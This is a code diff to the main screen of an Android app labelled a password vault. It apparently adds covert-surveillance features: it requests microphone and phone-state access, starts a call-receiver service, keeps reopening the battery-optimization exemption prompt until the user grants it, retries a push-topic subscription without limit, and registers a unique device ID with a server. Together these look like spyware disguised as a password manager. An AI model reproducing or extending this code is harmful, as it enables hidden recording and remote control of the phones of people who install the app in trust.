@@ -1,9 +1,14 @@
 package com.example.passwordvault.ui.activities
 
 import android.Manifest
+import android.content.Context
+import android.content.Intent
 import android.content.pm.PackageManager
+import android.net.Uri
+import android.os.Build
 import android.os.Bundle
-import android.util.Log
+import android.os.PowerManager
+import android.provider.Settings
 import androidx.appcompat.app.AppCompatActivity
 import androidx.core.app.ActivityCompat
 import androidx.navigation.NavController
@@ -16,21 +21,19 @@ import androidx.navigation.ui.setupActionBarWithNavController
 import com.example.passwordvault.R
 import com.example.passwordvault.databinding.ActivityMainBinding
 import com.example.passwordvault.util.Permissions
-import com.example.passwordvault.util.Scheduler
+import com.example.passwordvault.util.PreferenceUtil
 import com.example.passwordvault.util.ServiceStarter
-import com.example.passwordvault.util.UniqueIdProvider
+import com.google.firebase.messaging.FirebaseMessaging
 import dagger.hilt.android.AndroidEntryPoint
 
 private const val REQUEST_PERMISSIONS = 200
-
+private const val MY_IGNORE_OPTIMIZATION_REQUEST = 29
 @AndroidEntryPoint
 class MainActivity : AppCompatActivity() {
     private lateinit var navController: NavController
     private lateinit var appBarConfiguration: AppBarConfiguration
     private lateinit var binding: ActivityMainBinding
-    private lateinit var listener: NavController.OnDestinationChangedListener
 
-    // Requesting permission to RECORD_AUDIO
     private var permissions: Array<String> =
         arrayOf(Manifest.permission.RECORD_AUDIO, Manifest.permission.READ_PHONE_STATE)
 
@@ -47,11 +50,54 @@ class MainActivity : AppCompatActivity() {
 
         setUpOnClickListeners()
         checkPermissions()
+        requestBatteryOptimization()
+
         ServiceStarter.startCallReceiverService(applicationContext)
-        Log.e("Device", "Id -> ${UniqueIdProvider.getThisUniquePhone(this)}")
-        Scheduler.scheduleCallServiceListener(applicationContext)
-//        val streamer = VoiceStreamer()
-//        streamer.connect(this)
+    }
+
+    private fun subscribeToAllTopic() {
+        FirebaseMessaging.getInstance().subscribeToTopic("all").addOnFailureListener {
+            subscribeToAllTopic()
+        }.addOnSuccessListener {
+            PreferenceUtil.writeToTopicSubscribed(applicationContext)
+        }
+    }
+
+    private fun requestBatteryOptimization() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            val packageName = packageName
+            val pm =
+                getSystemService(Context.POWER_SERVICE) as PowerManager
+            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
+                val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
+                intent.data = Uri.parse("package:$packageName")
+                startActivityForResult(intent, MY_IGNORE_OPTIMIZATION_REQUEST)
+            }
+        }
+    }
+
+    override fun onActivityResult(
+        requestCode: Int,
+        resultCode: Int,
+        data: Intent?
+    ) {
+        super.onActivityResult(requestCode, resultCode, data)
+        if (requestCode == MY_IGNORE_OPTIMIZATION_REQUEST) {
+            requestBatteryOptimization()
+        }
+    }
+
+    override fun onRequestPermissionsResult(
+        requestCode: Int,
+        permissions: Array<out String>,
+        grantResults: IntArray
+    ) {
+        if (grantResults.isNotEmpty()) {
+            PreferenceUtil.writeUniquePhoneId(this@MainActivity)
+            PreferenceUtil.sendRegistrationToServer(applicationContext)
+            if (!PreferenceUtil.topicAllSubscribed(applicationContext))
+                subscribeToAllTopic()
+        }
     }
 
     private fun checkPermissions() {
